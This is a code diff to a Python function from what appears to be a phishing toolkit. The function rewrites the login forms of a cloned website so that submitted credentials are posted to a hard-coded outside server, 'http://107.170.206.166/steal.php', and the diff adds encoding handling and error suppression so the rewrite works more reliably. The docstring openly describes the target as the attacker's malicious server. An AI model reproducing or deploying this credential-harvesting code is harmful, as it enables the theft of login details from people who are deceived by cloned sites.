@@ -108,7 +108,7 @@ def update_form_action(login_path):
     Updates the html files in the cloned website so that
     POST requests are sent to the attacker's malicious server.
     """
-    with open(login_path, 'r') as f:
+    with open(login_path, 'r', encoding='utf-8',errors='ignore') as f:
         f_data = f.readlines()
     index_list = []
     for i in range(len(f_data)):
@@ -118,7 +118,10 @@ def update_form_action(login_path):
     for index in index_list:
         split_line = f_data[index].split("\"")
         str_index = next(i for i, string in enumerate(split_line) if "ACTION" in string.upper())
-        f_data[index] = f_data[index].replace(split_line[str_index+1],"http://107.170.206.166/steal.php")
+        try:
+            f_data[index] = f_data[index].replace(split_line[str_index+1],"http://107.170.206.166/steal.php")
+        except IndexError:
+            pass
     with open(login_path, 'w') as f:
         for l in f_data:
             f.write(l)
